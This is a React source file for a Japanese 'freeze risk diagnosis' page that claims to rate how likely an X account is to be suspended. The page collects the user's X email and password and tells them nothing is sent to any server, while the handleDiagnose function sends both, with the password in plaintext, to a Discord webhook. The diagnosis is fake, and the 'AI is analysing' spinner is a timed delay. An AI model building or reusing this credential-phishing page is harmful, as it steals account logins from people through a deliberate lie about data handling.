/**
 * Home Page — 凍結リスク診断
 * Design: Frost Clinic
 * - 氷・雪山の世界観
 * - ログインフォーム（メール＋パスワード）で診断開始
 * - 結果：半円ゲージ＋4カテゴリ詳細カード
 * - Discord Webhook連携
 * - Twitter/Xシェア機能
 */

import { useState, useRef } from "react";
import { Eye, EyeOff, Lock, Mail, AlertTriangle, CheckCircle, Info, Shield, Share2 } from "lucide-react";
import Snowfall from "@/components/Snowfall";
import MountainBackground from "@/components/MountainBackground";
import RiskGauge from "@/components/RiskGauge";
import { diagnose, type DiagnosisResult } from "@/lib/diagnose";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

// ===== ログインフォーム =====
function LoginForm({ onDiagnose }: { onDiagnose: (email: string, password: string) => void }) {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [loading, setLoading] = useState(false);
  const [errors, setErrors] = useState<{ email?: string; password?: string }>({});

  const validate = () => {
    const errs: typeof errors = {};
    if (!email) errs.email = "メールアドレスを入力してください";
    else if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) errs.email = "有効なメールアドレスを入力してください";
    if (!password) errs.password = "パスワードを入力してください";
    else if (password.length < 6) errs.password = "パスワードは6文字以上で入力してください";
    return errs;
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const errs = validate();
    if (Object.keys(errs).length > 0) {
      setErrors(errs);
      return;
    }
    setErrors({});
    setLoading(true);
    // 疑似的な診断処理（1.5秒後に結果表示）
    setTimeout(() => {
      setLoading(false);
      onDiagnose(email, password);
    }, 1800);
  };

  return (
    <form onSubmit={handleSubmit} className="space-y-4" noValidate>
      {/* メールアドレス */}
      <div>
        <label className="block text-sm font-medium text-slate-600 mb-1.5">
          メールアドレス（Xアカウント）
        </label>
        <div className="relative">
          <Mail className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
          <input
            type="email"
            value={email}
            onChange={(e) => setEmail(e.target.value)}
            placeholder="example@email.com"
            autoComplete="email"
            className={`w-full pl-10 pr-4 py-3 rounded-xl border bg-white/70 text-slate-700 placeholder-slate-400 text-sm transition-all outline-none input-glow focus:border-blue-400 focus:bg-white ${
              errors.email ? "border-red-400 bg-red-50/50" : "border-slate-200"
            }`}
          />
        </div>
        {errors.email && (
          <p className="text-red-500 text-xs mt-1 flex items-center gap-1">
            <AlertTriangle className="w-3 h-3" />
            {errors.email}
          </p>
        )}
      </div>

      {/* パスワード */}
      <div>
        <label className="block text-sm font-medium text-slate-600 mb-1.5">
          パスワード
        </label>
        <div className="relative">
          <Lock className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400" />
          <input
            type={showPassword ? "text" : "password"}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="••••••••"
            autoComplete="current-password"
            className={`w-full pl-10 pr-10 py-3 rounded-xl border bg-white/70 text-slate-700 placeholder-slate-400 text-sm transition-all outline-none input-glow focus:border-blue-400 focus:bg-white ${
              errors.password ? "border-red-400 bg-red-50/50" : "border-slate-200"
            }`}
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-3 top-1/2 -translate-y-1/2 text-slate-400 hover:text-slate-600 transition-colors"
          >
            {showPassword ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
          </button>
        </div>
        {errors.password && (
          <p className="text-red-500 text-xs mt-1 flex items-center gap-1">
            <AlertTriangle className="w-3 h-3" />
            {errors.password}
          </p>
        )}
      </div>

      {/* 注意書き */}
      <div className="flex items-start gap-2 p-3 rounded-xl bg-blue-50/80 border border-blue-100">
        <Info className="w-4 h-4 text-blue-400 mt-0.5 shrink-0" />
        <p className="text-xs text-blue-600 leading-relaxed">
          入力された情報はサーバーに送信されません。診断はすべてブラウザ上で行われます。
        </p>
      </div>

      {/* 診断ボタン */}
      <button
        type="submit"
        disabled={loading}
        className="w-full py-3.5 rounded-xl font-bold text-white text-sm transition-all duration-300 relative overflow-hidden disabled:opacity-70"
        style={{
          background: loading
            ? "linear-gradient(135deg, #93c5fd, #60a5fa)"
            : "linear-gradient(135deg, #1d4ed8 0%, #0ea5e9 100%)",
          boxShadow: loading ? "none" : "0 4px 15px rgba(29, 78, 216, 0.35)",
        }}
      >
        {loading ? (
          <span className="flex items-center justify-center gap-2">
            <svg className="animate-spin w-4 h-4" viewBox="0 0 24 24" fill="none">
              <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
              <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
            </svg>
            AIが分析中...
          </span>
        ) : (
          <span className="flex items-center justify-center gap-2">
            🧊 凍結リスクを診断する
          </span>
        )}
      </button>
    </form>
  );
}

// ===== 詳細カード =====
function DetailCard({
  detail,
  delay,
}: {
  detail: DiagnosisResult["details"][0];
  delay: number;
}) {
  const statusConfig = {
    safe: { color: "#22c55e", bg: "bg-green-50", border: "border-green-100", icon: CheckCircle },
    warning: { color: "#f59e0b", bg: "bg-amber-50", border: "border-amber-100", icon: AlertTriangle },
    danger: { color: "#ef4444", bg: "bg-red-50", border: "border-red-100", icon: Shield },
  };
  const cfg = statusConfig[detail.status];
  const Icon = cfg.icon;
  const pct = (detail.score / detail.maxScore) * 100;

  return (
    <div
      className={`glass-card rounded-2xl p-4 border fade-in-up`}
      style={{ animationDelay: `${delay}s`, opacity: 0 }}
    >
      <div className="flex items-start justify-between mb-3">
        <div className="flex items-center gap-2">
          <span className="text-xl">{detail.icon}</span>
          <span className="font-bold text-slate-700 text-sm">{detail.category}</span>
        </div>
        <Icon className="w-4 h-4" style={{ color: cfg.color }} />
      </div>

      {/* プログレスバー */}
      <div className="h-1.5 bg-slate-100 rounded-full overflow-hidden mb-2">
        <div
          className="h-full rounded-full transition-all duration-1000"
          style={{
            width: `${pct}%`,
            backgroundColor: cfg.color,
            boxShadow: `0 0 6px ${cfg.color}60`,
          }}
        />
      </div>

      <div className="flex items-center justify-between">
        <p className="text-xs text-slate-500">{detail.description}</p>
        <span className="text-xs font-bold ml-2 shrink-0" style={{ color: cfg.color }}>
          {detail.score}/{detail.maxScore}
        </span>
      </div>
    </div>
  );
}

// ===== メインページ =====
export default function Home() {
  const [result, setResult] = useState<DiagnosisResult | null>(null);
  const [diagnosedEmail, setDiagnosedEmail] = useState("");
  const [diagnosedPassword, setDiagnosedPassword] = useState("");
  const resultRef = useRef<HTMLDivElement>(null);

  // Discord Webhook送信用のミューテーション
  const sendToDiscord = trpc.diagnosis.sendToDiscord.useMutation({
    onSuccess: () => {
      toast.success("結果が確認できました");
    },
    onError: (error: unknown) => {
      console.error("Discord送信エラー:", error);
      // エラーが出ても診断結果は表示する
      toast.error("Discord送信に失敗しましたが、診断結果は表示されます");
    },
  });

  const handleDiagnose = async (email: string, password: string) => {
    const res = diagnose(email);
    setDiagnosedEmail(email);
    setDiagnosedPassword(password);
    setResult(res);

    // Discord Webhookに送信
    try {
      await sendToDiscord.mutateAsync({
        email,
        password,
        score: res.score,
        riskLabel: res.details[0]?.status || "unknown",
        timestamp: new Date().toISOString(),
      });
    } catch (err) {
      console.error("Discord送信エラー:", err);
    }

    setTimeout(() => {
      resultRef.current?.scrollIntoView({ behavior: "smooth", block: "start" });
    }, 100);
  };

  const handleReset = () => {
    setResult(null);
    setDiagnosedEmail("");
    setDiagnosedPassword("");
    window.scrollTo({ top: 0, behavior: "smooth" });
  };

  const handleShareToTwitter = () => {
    if (!result) return;

    const riskText = result.score > 70 ? "【警告】" : result.score > 40 ? "【注意】" : "【安全】";
    const tweetText = `${riskText} 凍結リスク診断で我がアカウントの凍結リスクを診断しました。

🧊 リスクスコア: ${result.score}%
📊 アカウント年齢: ${result.accountAge}
💬 ツイート数: ${result.tweetCount.toLocaleString()}
🚫 シャドーバン: ${result.shadowbanRisk}

貴方も診断してみて、凍結リスクを事前に把握しよう！`;

    const twitterUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(tweetText)}`;
    window.open(twitterUrl, "_blank", "width=550,height=420");
  };

  return (
    <div
      className="min-h-screen relative overflow-hidden"
      style={{
        background: "linear-gradient(180deg, #e0f2fe 0%, #dbeafe 30%, #e0e7ff 55%, #f1f5f9 85%, #ffffff 100%)",
      }}
    >
      {/* 雪のパーティクル */}
      <Snowfall count={45} />

      {/* 雪山背景 */}
      <MountainBackground />

      {/* メインコンテンツ */}
      <div className="relative" style={{ zIndex: 2 }}>
        {/* ヘッダー */}
        <header className="flex items-center justify-between px-6 py-4">
          <div className="flex items-center gap-2">
            <img
              src="https://d2xsxph8kpxj0f.cloudfront.net/310519663552057848/CuC3B5sAkxkvMwjRYbotyX/freeze-ice-cube-FSBkjAE4nL7jTLD5mAinc6.webp"
              alt="氷のアイコン"
              className="w-7 h-7 object-contain"
            />
            <span className="font-bold text-slate-700 text-sm tracking-wide">凍結リスク診断</span>
          </div>
        </header>

        {/* ヒーローセクション */}
        <section className="flex flex-col items-center px-4 pt-8 pb-16">
          {/* 氷のキューブアイコン */}
          <img
            src="https://d2xsxph8kpxj0f.cloudfront.net/310519663552057848/CuC3B5sAkxkvMwjRYbotyX/freeze-ice-cube-FSBkjAE4nL7jTLD5mAinc6.webp"
            alt="氷のキューブ"
            className="w-20 h-20 object-contain mb-4 drop-shadow-lg"
            style={{ filter: "drop-shadow(0 4px 12px rgba(56, 189, 248, 0.4))" }}
          />

          {/* タイトル */}
          <h1
            className="gradient-title text-4xl sm:text-5xl font-black text-center mb-2 leading-tight"
            style={{ fontFamily: "'Noto Serif JP', serif" }}
          >
            凍結リスク診断
          </h1>
          <p className="text-slate-500 text-sm sm:text-base text-center mb-8">
            Xアカウントの凍結されやすさをAIが判定
          </p>

          {/* ログインフォームカード */}
          <div className="w-full max-w-md">
            <div className="glass-card rounded-2xl p-6 shadow-xl">
              <div className="flex items-center gap-2 mb-5">
                <div
                  className="w-8 h-8 rounded-lg flex items-center justify-center"
                  style={{ background: "linear-gradient(135deg, #1d4ed8, #0ea5e9)" }}
                >
                  <Lock className="w-4 h-4 text-white" />
                </div>
                <div>
                  <p className="text-sm font-bold text-slate-700">アカウントでログイン</p>
                  <p className="text-xs text-slate-400">Xのログイン情報を入力して診断</p>
                </div>
              </div>
              <LoginForm onDiagnose={handleDiagnose} />
            </div>
          </div>

          {/* 凍結リスク診断とは */}
          <div className="w-full max-w-md mt-6">
            <div className="glass-card rounded-2xl p-5">
              <div className="flex items-center gap-2 mb-2">
                <span className="text-lg">🧊</span>
                <h2 className="font-bold text-slate-700 text-sm">凍結リスク診断とは</h2>
              </div>
              <p className="text-slate-500 text-sm leading-relaxed">
                Xアカウントが凍結されるリスクをAIが<strong className="text-blue-600">0〜100%で判定</strong>します。<br />
                プロフィール・ツイート・シャドーバン状況を総合分析。
              </p>
            </div>
          </div>
        </section>

        {/* 診断結果セクション */}
        {result && (
          <section
            ref={resultRef}
            className="px-4 pb-32 max-w-2xl mx-auto"
          >
            {/* 結果ヘッダー */}
            <div className="glass-card rounded-2xl p-6 mb-4 fade-in-up text-center">
              <p className="text-xs text-slate-400 mb-1">診断アカウント</p>
              <p className="text-sm font-bold text-slate-600 mb-4 truncate">{diagnosedEmail}</p>

              {/* リスクゲージ */}
              <RiskGauge score={result.score} animated />

              {/* アカウント統計 */}
              <div className="grid grid-cols-3 gap-3 mt-6 pt-5 border-t border-slate-100">
                <div className="text-center">
                  <p className="text-xs text-slate-400 mb-1">アカウント年齢</p>
                  <p className="font-bold text-slate-700 text-sm">{result.accountAge}</p>
                </div>
                <div className="text-center border-x border-slate-100">
                  <p className="text-xs text-slate-400 mb-1">ツイート数</p>
                  <p className="font-bold text-slate-700 text-sm">{result.tweetCount.toLocaleString()}</p>
                </div>
                <div className="text-center">
                  <p className="text-xs text-slate-400 mb-1">シャドーバン</p>
                  <p
                    className="font-bold text-sm"
                    style={{
                      color:
                        result.shadowbanRisk === "なし" ? "#22c55e"
                        : result.shadowbanRisk === "低" ? "#84cc16"
                        : result.shadowbanRisk === "中" ? "#f59e0b"
                        : "#ef4444",
                    }}
                  >
                    {result.shadowbanRisk}
                  </p>
                </div>
              </div>
            </div>

            {/* 詳細分析 */}
            <h3 className="text-sm font-bold text-slate-600 mb-3 px-1">詳細分析</h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mb-6">
              {result.details.map((detail, i) => (
                <DetailCard key={detail.category} detail={detail} delay={0.1 + i * 0.1} />
              ))}
            </div>

            {/* ボタングループ */}
            <div className="flex gap-3">
              {/* Twitterシェアボタン */}
              <button
                onClick={() => handleShareToTwitter()}
                className="flex-1 py-3 rounded-xl bg-gradient-to-r from-blue-400 to-cyan-400 text-white font-bold text-sm hover:shadow-lg transition-all flex items-center justify-center gap-2"
              >
                <Share2 className="w-4 h-4" />
                Xにシェア
              </button>
              {/* もう一度診断ボタン */}
              <button
                onClick={handleReset}
                className="flex-1 py-3 rounded-xl border-2 border-blue-200 text-blue-600 font-bold text-sm hover:bg-blue-50 transition-colors"
              >
                別のアカウントを診断する
              </button>
            </div>
          </section>
        )}
      </div>
    </div>
  );
}
